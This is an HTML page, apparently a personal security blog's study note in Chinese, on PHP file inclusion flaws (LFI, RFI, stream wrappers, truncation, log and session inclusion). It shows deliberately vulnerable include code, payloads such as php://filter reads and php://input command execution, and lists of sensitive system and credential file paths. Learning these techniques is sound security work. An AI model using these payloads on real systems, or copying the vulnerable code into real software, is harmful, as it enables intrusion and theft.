@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Code for fun, Hack for world">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        php文件包含漏洞 - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> Code for fun, Hack for world </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>Noname</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">php文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0"><span class="toc-text">描述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-text">相关函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-LFI"><span class="toc-text">本地包含漏洞(LFI)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-RFI"><span class="toc-text">远程文件包含(RFI)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8"><span class="toc-text">敏感文件利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%ABshell"><span class="toc-text">远程包含shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input"><span class="toc-text">php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-output"><span class="toc-text">php:&#x2F;&#x2F;output</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file"><span class="toc-text">file:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-filter"><span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#data"><span class="toc-text">data:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">压缩包伪协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6"><span class="toc-text">绕过限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%AA%E6%96%AD"><span class="toc-text">截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">编码绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-text">利用日志文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%85%E5%90%ABsession"><span class="toc-text">包含session</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9ERCE"><span class="toc-text">利用session文件包含漏洞RCE</span></a></li></ol></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> Code for fun, Hack for world </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        php文件包含漏洞
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2022-01-20 11:36:21</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#web" title="web">web</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h1 id="php文件包含漏洞"><a href="#php文件包含漏洞" class="headerlink" title="php文件包含漏洞"></a>php文件包含漏洞</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote>
+<p>开发人员为了使得代码更灵活，会将被包含的文件设置为变量，用来进行动态调用，从而导致客户端可以恶意调用一个恶意文件，造成文件包含漏洞</p>
+</blockquote>
+<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include()</span><br><span class="line">include_once()</span><br><span class="line">require()</span><br><span class="line">require_once()</span><br></pre></td></tr></table></figure>
+
+<p>include 和 require的区别在于，如果包含的文件有错误，include会继续往下执行，如果是require就不会</p>
+<h2 id="本地包含漏洞-LFI"><a href="#本地包含漏洞-LFI" class="headerlink" title="本地包含漏洞(LFI)"></a>本地包含漏洞(LFI)</h2><p>一个phpinfo.txt走天下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;phpinfo.txt&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>只要文件内容复合php语法规范，那么任何扩展名都可以被php解析<br>包含非php语法规范原文件时，将会暴露其源代码</p>
+<p>典型的漏洞代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]; </span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>filename没有进行过滤，可以被用户控制<br>这里可以结合目录遍历漏洞查看敏感信息</p>
+<h2 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h2><p>注：要确定php是否已经开启远程包含功能(默认是关闭)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alow_url_include = On</span><br></pre></td></tr></table></figure>
+
+<p>栗子：</p>
+<p><a target="_blank" rel="noopener" href="http://www.text.com根目录存在phpinfo.txt/">www.text.com根目录存在phpinfo.txt</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://www.text.com/?a=http://www.text.com/phpinfo.txt">www.text.com?a=http://www.text.com/phpinfo.txt</a></p>
+<p>若文件不存在，也可以通过观察暴露出的警告</p>
+<h2 id="敏感文件利用"><a href="#敏感文件利用" class="headerlink" title="敏感文件利用"></a>敏感文件利用</h2><p>利用重点：找到可控的文件</p>
+<p>对于可执行的文件(包含可执行php代码的文件，不一定是php后缀)：可以直接利用文件包含执行<br>对于不可执行的文件：可以利用文件包含查看其内容</p>
+<p>Windows系统：</p>
+<table>
+<thead>
+<tr>
+<th>文件</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>C:\boot.ini</td>
+<td>系统版本</td>
+</tr>
+<tr>
+<td>C:\windows\system32\intetsrv\MetaBase.xml</td>
+<td>IIS配置文件</td>
+</tr>
+<tr>
+<td>C:\windows\repair\sam</td>
+<td>存储Windows系统初次安装的密码</td>
+</tr>
+<tr>
+<td>C:\Program Files\mysql\my.ini</td>
+<td>Mysql配置</td>
+</tr>
+<tr>
+<td>C:\windows\mysql\data\mysql\user.MYD</td>
+<td>Mysql root</td>
+</tr>
+<tr>
+<td>C:\window\php.inis</td>
+<td>php配置信息</td>
+</tr>
+<tr>
+<td>C:\windows\my.ini</td>
+<td>Mysql配置文件</td>
+</tr>
+</tbody></table>
+<p>Unix/Linux系统：</p>
+<table>
+<thead>
+<tr>
+<th>文件</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>/etc/passwd</td>
+<td></td>
+</tr>
+<tr>
+<td>/usr/local/app/apache/conf/httpd.conf</td>
+<td>apache默认配置文件</td>
+</tr>
+<tr>
+<td>/usr/local/app/apache/conf/extra/httpd-vhosts.conf</td>
+<td>虚拟网站设置</td>
+</tr>
+<tr>
+<td>/usr/local/app/php5/lib/php.ini</td>
+<td>php相关设置</td>
+</tr>
+<tr>
+<td>/etc/httpd/conf/httpd.conf</td>
+<td>apache配置文件</td>
+</tr>
+<tr>
+<td>/etc/my.cnf</td>
+<td>mysql的配置文件</td>
+</tr>
+</tbody></table>
+<h2 id="远程包含shell"><a href="#远程包含shell" class="headerlink" title="远程包含shell"></a>远程包含shell</h2><p>若目标主机<code>allow_url_fopen</code>的选项是激活的，然后包含一句话木马</p>
+<blockquote>
+<p>（1） allow_url_fopen=on<br>本选项激活了URL形式的fopen封装协议使得可以访问URL对象例如文件，默认的封装协议提供ftp和http协议来访问远程文件，一些扩展库例如zlib可能会注册更多的封装协议<br>（2） allow_url_include=on<br>This option allows the use of URL-aware fopen wrappers with the following functions： include…</p>
+</blockquote>
+<p>?filename=你的远程文件路径<br>远程文件中的php代码会被解析<br>若后缀名写死了，可以用?绕过</p>
+<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.file.php">file://</a> — 访问本地文件系统</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.http.php">http://</a> — 访问 HTTP(s) 网址</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.ftp.php">ftp://</a> — 访问 FTP(s) URLs</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php">php://</a> — 访问各个输入/输出流（I/O streams）</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.compression.php">zlib://</a> — 压缩流</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.data.php">data://</a> — 数据（RFC 2397）</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.glob.php">glob://</a> — 查找匹配的文件路径模式</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.phar.php">phar://</a> — PHP 归档</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.ssh2.php">ssh2://</a> — Secure Shell 2</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.rar.php">rar://</a> — RAR</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.audio.php">ogg://</a> — 音频流</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.expect.php">expect://</a> — 处理交互式的流</li>
+</ul>
+<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>代表可以访问请求的原始数据，可以获取到post的数据并将其作为php代码执行</p>
+<p>条件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen: off/on</span><br><span class="line"></span><br><span class="line">allow_url_include: on</span><br><span class="line">index.php?file=php:<span class="comment">//input</span></span><br><span class="line">POST:</span><br><span class="line"><span class="meta">&lt;?</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用</p>
+<p>遇到file_get_contents()可以利用该协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(&quot;php://input&quot;);</span><br><span class="line">POST:xxx</span><br></pre></td></tr></table></figure>
+
+<p><strong>写木马</strong></p>
+<p>条件：php中开启allow_url_fopen 和 allow_url_include（PHP &lt; 5.3.0）</p>
+<p>POST: 木马</p>
+<p><strong>命令执行</strong></p>
+<p>POST:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&#x27;ls -a&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h3><p>只写的数据流</p>
+<h3 id="file"><a href="#file" class="headerlink" title="file:"></a>file:</h3><p>file://[绝对路径及文件名]</p>
+<p>访问本地文件</p>
+<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>一种元封装器，设计用于数据流打开时的筛选过滤应用，也就是过滤器</p>
+<p>参数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line"></span><br><span class="line">read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line"></span><br><span class="line">write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line"></span><br><span class="line">&lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure>
+
+<p>常用的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=xxx.php</span><br><span class="line">php://filter/convert.base64-encode/resource=/flag</span><br><span class="line">php://filter/write=convert.base64-decode/resource=xxx.php </span><br></pre></td></tr></table></figure>
+
+<p>这里就是使用convert.base64-encode这个过滤器，对xxx.php的内容进行base64编码后再读取</p>
+<p>还有其他一些奇妙的编码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stream_filter_append stream_filter_prepend</span><br><span class="line">给流添加过滤器 </span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">https://www.smi1e.top/文件包含漏洞与php伪协议/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a></p>
+<h3 id="data"><a href="#data" class="headerlink" title="data:"></a>data:</h3><p>data:资源类型;编码,内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,xxxxx</span></span><br><span class="line">data:text/plain,xxxxx</span><br><span class="line">data:<span class="comment">//text/plain;base64,xxxxx</span></span><br><span class="line">data:text/plain;base64,xxxxx </span><br></pre></td></tr></table></figure>
+
+<h3 id="压缩包伪协议"><a href="#压缩包伪协议" class="headerlink" title="压缩包伪协议"></a>压缩包伪协议</h3><p>pchar://</p>
+<p>zip://</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=zip://xxxxxx#phpinfo.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h2><h3 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>,<span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>%00截断-&gt;导致扩展名被截断</p>
+<blockquote>
+<p>(1) magic_quotes_gpc=off(2) PHP&lt;5.3.4<br>构造超过最大长度限制payload-系统会将后面的路径丢弃，扩展名被截断<br>Windows下目录的最大路径256BLinux下目录的最大路径长度为4096B</p>
+</blockquote>
+<p>注意这里要# 有编码问题时替换成#</p>
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>url多次编码<br>unicode形近字型绕过</p>
+<h2 id="利用日志文件"><a href="#利用日志文件" class="headerlink" title="利用日志文件"></a>利用日志文件</h2><p>用户发起请求时会将请求写入 <strong>access.log</strong></p>
+<p>发生错误时将错误写入 <strong>error.log</strong></p>
+<p>一些常见的日志路径：</p>
+<p>/var/log/nginx/access.log<br>/var/log/apache2/access.log</p>
+<h2 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h2><p>php的session文件保存路径可以在<strong>phpinfo</strong>中的session.save_path看到，若为空，说明在默认存放位置</p>
+<p>命名格式：sess_[PHPSESSID]</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1./var/lib/php/sess_PHPSESSID</span><br><span class="line">(php5 or php 7 or php)</span><br><span class="line">2./tmp/sess_PHPSESSID</span><br><span class="line">3./tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>
+
+<p>查看PHPSESSID</p>
+<p>F12-Application-Cookies</p>
+<p>一个小参考，先记录一些未来可能出现的考点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=&quot;&quot;  --设置session的存储路径session.save_handler=&quot;&quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)，默认files以文件存储session.auto_start  boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动session.serialize_handler  string --定义用来序列化/</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/90879209">https://zhuanlan.zhihu.com/p/90879209</a></p>
+<h3 id="利用session文件包含漏洞RCE"><a href="#利用session文件包含漏洞RCE" class="headerlink" title="利用session文件包含漏洞RCE"></a>利用session文件包含漏洞RCE</h3><blockquote>
+<p>session.upload_progress.enabled </p>
+<p>若不在php.ini中将其置为Off，就会在上传过程中生成上传进度文件，并且可以从phpinfo中获取</p>
+</blockquote>
+<p>当session中的内容可以控制（如传参内容没被过滤，传入的值存储到session中），就可以利用传参的过程获取敏感信息或RCE</p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a target="_blank" rel="noopener" href="https://www.10000h.top">10000H</a></span>
+        <span>/</span>
+        
+        <span><a target="_blank" rel="noopener" href="https://niexiaotao.com">Xiaotao&#39;s Page</a></span>
+        <span>/</span>
+        
+        <span><a href="#">It helps SEO</a></span>
+        <span>/</span>
+        
+        <span><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">浙ICP备16035324号-1</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
